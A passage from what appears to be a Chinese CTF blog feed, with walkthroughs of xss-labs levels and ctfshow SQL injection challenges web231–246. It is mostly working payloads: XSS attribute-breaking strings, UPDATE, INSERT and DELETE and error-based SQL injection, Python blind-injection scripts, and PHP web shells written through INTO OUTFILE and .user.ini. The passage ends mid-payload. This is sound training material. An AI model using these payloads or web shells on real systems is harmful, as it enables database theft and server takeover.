invoke__">strpos</span>(<span class="variable">$str7</span>,<span class="string">&#x27;http://&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>必须要有http://, 但是在最后增加会导致跳转不可用, 注释掉<a href="http://xn--xft693h">http://就行</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;//http://</span><br></pre></td></tr></table></figure><h2 id="level10"><a class="header-anchor" href="#level10">¶</a>level10</h2><p>在源码可以找到三个传参点, 最后找到<code>t_sort</code>可以作为传参点, 传参在value</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_link&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_history&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_sort&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>input标签进行注入可以闭合属性, 构造新的属性, 同时把type=&quot;hidden&quot;属性替换掉</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">level10.php?keyword=1&amp;t_sort=&#x27;&quot; type=&#x27;text&#x27; onclick=&#x27;alert(1)&#x27;</span><br></pre></td></tr></table></figure><h2 id="level11"><a class="header-anchor" href="#level11">¶</a>level11</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_link&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_history&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_sort&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_ref&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;http://127.0.0.1:8903/level10.php?keyword=1&amp;t_sort=%27%22%20type=%27text%27%20onclick=%27alert(123)%27&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这个<code>t_ref</code>是上一关跳转过来的referer, referer是没有过滤的</p><p>所以将下面payload塞进referer然后取得输入框焦点即可:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&quot;type=&#x27;text&#x27; onclick=&#x27;alert(1)&#x27;</span><br></pre></td></tr></table></figure><h2 id="level12"><a class="header-anchor" href="#level12">¶</a>level12</h2><p><code>t_ua</code>没有被编码, 这次是User Agent, 换成上面的payload即可</p><h2 id="level13"><a class="header-anchor" href="#level13">¶</a>level13</h2><p>刷新页面抓包, 将Cookie改成上面的payload即可</p><h2 id="level14"><a class="header-anchor" href="#level14">¶</a>level14</h2><p><a href="https://blog.csdn.net/qq_40929683/article/details/120422266?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172425177016800182119154%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=172425177016800182119154&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-120422266-null-null.142%5Ev100%5Epc_search_result_base6&amp;utm_term=xss-labs%2014&amp;spm=1018.2226.3001.4187">大佬解析</a></p><p>需要安装flash我认为可以直接拉倒</p><p>反正就是上传一个包含xss的图片然后被解析出来</p><h2 id="level15"><a class="header-anchor" href="#level15">¶</a>level15</h2><p>跳转有问题, 我自己的网址是: <code>/level15.php?src=1.gif</code></p><p>根据提示和官方文档, 发现可以包含页面, 尝试包含level1</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8903/level15.php?src=%27http://127.0.0.1:8903/level1.php%27</span><br></pre></td></tr></table></figure><p>利用level1的payload似乎被过滤了, 尝试后是<code>&lt;script&gt;</code></p><p>尝试其他的, 发现可以利用以下payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8903/level15.php?src=&#x27;level1.php?name=&lt;img src=123 οnerrοr=alert(1)&gt;&#x27;</span><br></pre></td></tr></table></figure><p>无法弹出弹窗, 拉倒了</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 绕过 </tag>
            
            <tag> XSS </tag>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web入门_sql注入_4</title>
      <link href="/article/ctfshow-webbasic-sql-4/"/>
      <url>/article/ctfshow-webbasic-sql-4/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>sql注入</h1><hr><h2 id="web-231"><a class="header-anchor" href="#web-231">¶</a>web 231</h2><ul><li>描述: update 注入</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update ctfshow_user set pass = &#x27;<span class="subst">&#123;$password&#125;</span>&#x27; where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line"><span class="comment">// 无过滤</span></span><br></pre></td></tr></table></figure><p>可以利用子查询将结果更新到可见表中, 在password这里闭合语句就好</p><blockquote><p>注意本题是将<code>password</code>和<code>username</code>都POST过去, 在api那里GET了半天发现有<code>&quot;data&quot;:[]</code></p></blockquote><p>执行完下面的语句回到<code>/update.php</code>, 如果发现用户名全都变了那就成功了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查库 </span><br><span class="line">password=1&#x27;,username=database()#&amp;username=1</span><br><span class="line"># 查表 banlist,ctfshow_user,flaga</span><br><span class="line">password=1&#x27;,username=(select group_concat(table_name) from information_schema.tables where table_schema=database())#&amp;username=1</span><br><span class="line"># 查列 id,flagas,info</span><br><span class="line">password=1&#x27;,username=(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flaga&#x27;)#&amp;username=1</span><br><span class="line"># 查字段</span><br><span class="line">password=1&#x27;,username=(select flagas from ctfshow_web.flaga) where 1=1#&amp;username=1</span><br></pre></td></tr></table></figure><p>也可以利用盲注, 我就直接上大佬脚本吧</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># By gkjzjh146</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://6dba60c7-91d2-4d8d-a0c8-2aeb3115cf71.challenge.ctf.show/api/&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">x = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60</span>):</span><br><span class="line">    <span class="built_in">min</span>,<span class="built_in">max</span> = <span class="number">32</span>, <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        j = <span class="built_in">min</span> + (<span class="built_in">max</span>-<span class="built_in">min</span>)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">min</span> == j):</span><br><span class="line">            <span class="built_in">str</span> += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># 爆表名</span></span><br><span class="line">        <span class="comment"># payload = &#123;</span></span><br><span class="line">        <span class="comment">#     &#x27;username&#x27;: &quot;ctfshow&quot;+&quot;&#125;&quot;+&quot;&#x27; or if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;,true,false)#&quot;.format(i, j),</span></span><br><span class="line">        <span class="comment">#     &#x27;password&#x27;: f&quot;&#123;x&#125;&quot;</span></span><br><span class="line">        <span class="comment"># &#125;</span></span><br><span class="line">        <span class="comment"># 爆列</span></span><br><span class="line">        <span class="comment"># payload = &#123;</span></span><br><span class="line">        <span class="comment">#     &#x27;username&#x27;: &quot;ctfshow&quot;+&quot;&#125;&quot;+&quot;&#x27; or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flaga&#x27;),&#123;&#125;,1))&lt;&#123;&#125;,true,false)#&quot;.format(i, j),</span></span><br><span class="line">        <span class="comment">#     &#x27;password&#x27;: f&quot;&#123;x&#125;&quot;</span></span><br><span class="line">        <span class="comment"># &#125;</span></span><br><span class="line">        <span class="comment"># # 爆值</span></span><br><span class="line">        payload = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;ctfshow&quot;</span>+<span class="string">&quot;&#125;&quot;</span>+<span class="string">&quot;&#x27; or if(ascii(substr((select group_concat(flagas) from flaga),&#123;0&#125;,1))&lt;&#123;1&#125;,true,false)#&quot;</span>.<span class="built_in">format</span>(i, j),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">f&quot;<span class="subst">&#123;x&#125;</span>&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># payload = &#123;&#x27;username&#x27;:f&quot;if(load_file(&#x27;/var/www/html/api/index.php&#x27;)regexp(&#x27;&#123;flag+j&#125;&#x27;),0,1)&quot;,</span></span><br><span class="line">        <span class="comment">#            &#x27;password&#x27;:0&#125;</span></span><br><span class="line">        r = requests.post(url=url,data=payload).text</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">r&#x27;\u66f4\u65b0\u6210\u529f&#x27;</span> <span class="keyword">in</span> r):</span><br><span class="line">            <span class="built_in">max</span> = j</span><br><span class="line">            x += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">min</span> = j</span><br><span class="line">            x += <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="web232"><a class="header-anchor" href="#web232">¶</a>web232</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update ctfshow_user set pass = md5(&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;) where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure><p>闭合md5函数的右括号即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查库</span><br><span class="line">password=1&#x27;),username=database()#&amp;username=1</span><br><span class="line"># 省略部分步骤</span><br><span class="line"># 查字段</span><br><span class="line">password=1&#x27;),username=(select flagass from ctfshow_web.flagaa) where 1=1#&amp;username=1</span><br></pre></td></tr></table></figure><h2 id="web233-234"><a class="header-anchor" href="#web233-234">¶</a>web233-234</h2><ul><li>描述: 23333</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update ctfshow_user set pass = &#x27;<span class="subst">&#123;$password&#125;</span>&#x27; where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure><p>可以利用转译符号去掉特定的单引号:</p><p>例如password传入<code>\</code>, username为<code>username=database()#</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update ctfshow_user set pass = &#x27;\&#x27; where username = &#x27;,username=database()#&#x27;</span><br><span class="line"># 等价于</span><br><span class="line">update ctfshow_user set pass = &#x27;x&#x27;,username=database()#&#x27;</span><br></pre></td></tr></table></figure><p>所以可以构造:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=1\&amp;username=,username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#</span><br></pre></td></tr></table></figure><p>剩下的就是改语句, 不再赘述了</p><h2 id="web235-236"><a class="header-anchor" href="#web235-236">¶</a>web235-236</h2><p>描述: update</p><p>过滤or, 现在<code>information_schema</code>也无了</p><p><a href="https://www.jb51.net/article/134678.htm">概述MySQL统计信息</a> 和 <a href="https://zhuanlan.zhihu.com/p/98206699">无列名注入</a> 以及 <a href="https://blog.csdn.net/qq_45521281/article/details/106647880">Bypass information_schema与无列名注入</a></p><p>利用<code>innodb_table_stats</code>代替<code>information_schema</code></p><blockquote><p>mysql默认存储引擎innoDB携带的表:</p></blockquote><p><code>mysql.innodb_table_stats</code>和<code>mysql.innodb_index_stats</code>, 两表均有<code>database_name</code>和<code>table_name</code>字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查表 banlist,ctfshow_user,flag23a1</span><br><span class="line">password=1\&amp;username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#</span><br></pre></td></tr></table></figure><p>下面就是无列注入的内容:</p><p>前面做题可以知道表结构为: id, username, password, 所以构造</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1,2,3 union select * from flag23a1</span><br></pre></td></tr></table></figure><p>数字与users中的列相应, 现在可以利用数字对列进行查询了:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select `1` from (select 1,2,3 union select * from flag23a1)a;</span><br><span class="line"># 就相当于select pass from (select 1,2,3 union select * from users)a;</span><br></pre></td></tr></table></figure><p>所以最后payload, (似乎只有反引号不会回显, 只能加上<code>group_concat</code>)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=1\&amp;username=,username=(select group_concat(`2`) from(select 1,2,3 union select * from flag23a1)a)#</span><br></pre></td></tr></table></figure><h2 id="web237"><a class="header-anchor" href="#web237">¶</a>web237</h2><ul><li>描述: insert</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//插入数据</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into ctfshow_user(username,pass) value(&#x27;<span class="subst">&#123;$username&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;);&quot;</span>;</span><br><span class="line"><span class="comment">// 无过滤</span></span><br></pre></td></tr></table></figure><p>你说的对但是有人因为开了过滤广告的插件导致插入界面弹不出来, 找了半天在哪里能提交包</p><p>先测试一下, 注意闭合value的括号:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=123&#x27;,(select database()))#&amp;password=123</span><br></pre></td></tr></table></figure><p>然后刷新界面可以看到多出了一条密码为ctfshow_web的条目, 语句拼接最终变为:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into ctfshow_user(username,pass) value(&#x27;123&#x27;,(select database()))#&#x27;,&#x27;123&#x27;);</span><br></pre></td></tr></table></figure><p>没有过滤直接如法炮制即可:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查表：</span><br><span class="line">username=123&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()))#&amp;password=123</span><br><span class="line"># 查列：</span><br><span class="line">username=123&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;))#&amp;password=123</span><br><span class="line"># 查数据：</span><br><span class="line">username=123&#x27;,(select group_concat(flagass23s3) from flag))#&amp;password=123</span><br></pre></td></tr></table></figure><h2 id="web238"><a class="header-anchor" href="#web238">¶</a>web238</h2><ul><li>描述: 同上</li></ul><p>过滤了空格, 可以使用()代替</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查表</span><br><span class="line">username=12&#x27;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))%23&amp;password=123</span><br><span class="line"># 查列</span><br><span class="line">username=12&#x27;,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flagb&#x27;)))%23&amp;password=123</span><br><span class="line"># 查数据</span><br><span class="line">username=12&#x27;,(select(group_concat(flag))from(flagb)))%23&amp;password=123</span><br></pre></td></tr></table></figure><h2 id="web239"><a class="header-anchor" href="#web239">¶</a>web239</h2><ul><li>描述: 同上</li></ul><p>上题基础上再过滤or, 利用无列注入即可; web235有提及</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查表</span><br><span class="line">username=1&#x27;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())))#&amp;password=1</span><br><span class="line"># 查数据, 别问, 问就是能跑</span><br><span class="line">username=1&#x27;,(select(group_concat(flag))from(flagbb)))%23&amp;password=1</span><br></pre></td></tr></table></figure><h2 id="web240"><a class="header-anchor" href="#web240">¶</a>web240</h2><ul><li>描述: 同上</li><li>Hint: 表名共9位，flag开头，后五位由a/b组成，如flagabaab，全小写</li></ul><p>过滤空格 or sys mysql</p><p>大佬写的, 因为直接提示了前面四个字符为flag, 在表不变的情况下, 列名还是flag, 直接爆破即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">url=<span class="string">&#x27;http://1a19dc60-01fb-40fc-bede-45b9a595b069.challenge.ctf.show/api/insert.php&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">str</span>=<span class="string">&#x27;ab&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">for</span> z <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">            <span class="keyword">for</span> u <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">                    data=&#123;</span><br><span class="line">                        <span class="string">&#x27;username&#x27;</span>:<span class="string">f&quot;123&#x27;,(select(group_concat(flag))from(flag<span class="subst">&#123;i+x+z+u+j&#125;</span>)))#&quot;</span>,</span><br><span class="line">                        <span class="string">&#x27;password&#x27;</span>:<span class="number">123</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="built_in">print</span>(data)</span><br><span class="line">                    res=requests.post(url=url,data=data)</span><br><span class="line">                    <span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><h2 id="web241"><a class="header-anchor" href="#web241">¶</a>web241</h2><ul><li>描述: delete</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//删除记录</span></span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;delete from  ctfshow_user where id = <span class="subst">&#123;$id&#125;</span>&quot;</span>;</span><br><span class="line"><span class="comment">//无过滤</span></span><br></pre></td></tr></table></figure><p>delete不能用union和select, 可以用报错注入或者是盲注</p><p>报错注入回显被覆盖, 只能回显&quot;删除成功&quot;, 还是用时间盲注吧</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://47a7a298-f821-41b6-9f49-a24094ab0337.challenge.ctf.show/api/delete.php&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="built_in">max</span> = <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        j = <span class="built_in">min</span> + (<span class="built_in">max</span> - <span class="built_in">min</span>) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">min</span> == j:</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># payload=f&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.02),1)&quot;</span></span><br><span class="line">        <span class="comment"># payload=f&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.02),1)&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;if(ascii(substr((select group_concat(flag) from flag),<span class="subst">&#123;i&#125;</span>,1))&lt;<span class="subst">&#123;j&#125;</span>,sleep(0.02),1)&quot;</span></span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: payload</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url=url, data=data, timeout=<span class="number">0.38</span>)</span><br><span class="line">            <span class="built_in">min</span> = j</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">max</span> = j</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web242"><a class="header-anchor" href="#web242">¶</a>web242</h2><ul><li>描述: file</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//备份表</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from ctfshow_user into outfile &#x27;/var/www/html/dump/<span class="subst">&#123;$filename&#125;</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure><p>可以查询<a href="https://blog.csdn.net/weixin_50002038/article/details/131349038?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172428951916800211586545%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=172428951916800211586545&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-131349038-null-null.142%5Ev100%5Epc_search_result_base6&amp;utm_term=select%20...%20into%20outfile&amp;spm=1018.2226.3001.4187">into outfile的使用</a>, 我们可以在导出的文件头中加入一句话木马</p><blockquote><p>官方关于<a href="https://dev.mysql.com/doc/refman/8.4/en/select-into.html">select into的解释</a></p></blockquote><p>抓导出的包, 在api/dump.php注入:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=1.php&#x27; LINES STARTING BY &#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;#</span><br></pre></td></tr></table></figure><p>然后访问dump/1.php, 进行POST命令执行即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=system(&#x27;tac /flag.here&#x27;);</span><br></pre></td></tr></table></figure><h2 id="web243"><a class="header-anchor" href="#web243">¶</a>web243</h2><ul><li>描述: 同上</li></ul><p>仅过滤了php, 可以利用配置文件<code>.user.ini</code>传入</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">auto_append_file</span>=<span class="number">1</span>.png</span><br></pre></td></tr></table></figure><blockquote><p>注意, 要至少有一个php文件, 而<code>/dump</code>下刚好有一个index.php, 只不过是不能直接访问的</p></blockquote><p>可以继续用starting by, 也可以用terminated by后接上16进制, 利用分号闭合前面的select</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># auto_prepend_file=easy.png十六进制加密</span><br><span class="line">filename=.user.ini&#x27; LINES STARTING BY &#x27;;&#x27; TERMINATED BY 0x0a6175746f5f70726570656e645f66696c653d312e706e670a;#</span><br><span class="line"># 再将png写入:</span><br><span class="line">filename=easy.png&#x27; LINES TERMINATED BY 0x3c3f706870206576616c28245f504f53545b305d293b3f3e#</span><br></pre></td></tr></table></figure><p>或者直接明文即可:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=.user.ini&#x27; lines starting by &#x27;auto_prepend_file=1.png\n&#x27;#</span><br><span class="line"># 修改一下马的写法</span><br><span class="line">filename=1.png&#x27; lines starting by &#x27;&lt;?= eval($_POST[1]);?&gt;&#x27;#</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240822095253481.png" alt="image-20240822095253481"></p><h2 id="web244"><a class="header-anchor" href="#web244">¶</a>web244</h2><ul><li>描述: error</li></ul><p>报错注入, 变成了输入框</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//备份表</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br></pre></td></tr></table></figure><p>注意因为显示不全需要利用<code>mid</code>函数截取flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查表</span><br><span class="line">?id=1&#x27; or updatexml(1,concat(0x3d,mid((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27;),1,32),0x3d),1)--+</span><br><span class="line"># 查列</span><br><span class="line">?id=1&#x27; or updatexml(1,concat(0x3d,mid((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flag&#x27;),1,32),0x3d),1)--+</span><br><span class="line"># 查flag</span><br><span class="line">?id=1&#x27; or updatexml(1,concat(0x3d,mid((select group_concat(flag) from ctfshow_flag),1,32),0x3d),1)--+</span><br><span class="line">?id=1&#x27; or updatexml(1,concat(0x3d,mid((select group_concat(flag) from ctfshow_flag),32,32),0x3d),1)--+</span><br></pre></td></tr></table></figure><h2 id="web245"><a class="header-anchor" href="#web245">¶</a>web245</h2><ul><li>描述: 同上</li></ul><p>过滤<code>updatexml</code>那就用<code>extractvalue</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查表 ctfshow_flagsa</span><br><span class="line">?id=1&#x27; or extractvalue(1,concat(0x3d,mid((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27;),1,32),0x3d))--+</span><br><span class="line"># 查列 flag1</span><br><span class="line">?id=1&#x27; or extractvalue(1,concat(0x3d,mid((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagsa&#x27;),1,32),0x3d))--+</span><br><span class="line"># 查flag</span><br><span class="line">?id=1&#x27; or extractvalue(1,concat(0x3d,mid((select group_concat(flag1) from ctfshow_flagsa),1,32),0x3d))--+</span><br><span class="line">?id=1&#x27; or extractvalue(1,concat(0x3d,mid((select group_concat(flag1) from ctfshow_flagsa),32,32),0x3d))--+</span><br></pre></td></tr></table></figure><h2 id="web246"><a class="header-anchor" href="#web246">¶</a>web246</h2><ul><li>描述: 同上</li></ul><p>好一个无过滤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//无过滤</span><br><span class="line">过滤updatexml extractvalue</span><br></pre></td></tr></table></figure><p>利用<a href="https://blog.csdn.net/qq_63844103/article/details/128569910?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172429269116800222870805%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=172429269116800222870805&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-128569910-null-null.142%5Ev100%5Epc_search_result_base6&amp;utm_term=floor%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5&amp;spm=1018.2226.3001.4187">floor报错注入</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查表</span><br><span class="line">?id=-1&#x27; union select 1,count(*),concat(0x3a,0x3a,(select (table_name) from information_schema.tables where table_schema=database() limit 1,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23</span><br><span class="line"># 查列</span><br><span class="line">?id=-1&#x27; union select 1,count(*),concat(0x3a,0x3a,(select (column_name) from information_schema.columns where table_name=&#x27;ctfshow_flags&#x27; limit 1,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23</span><br><span class="line"># 查数据</span><br><span class="line">?id=-1&#x27; union select 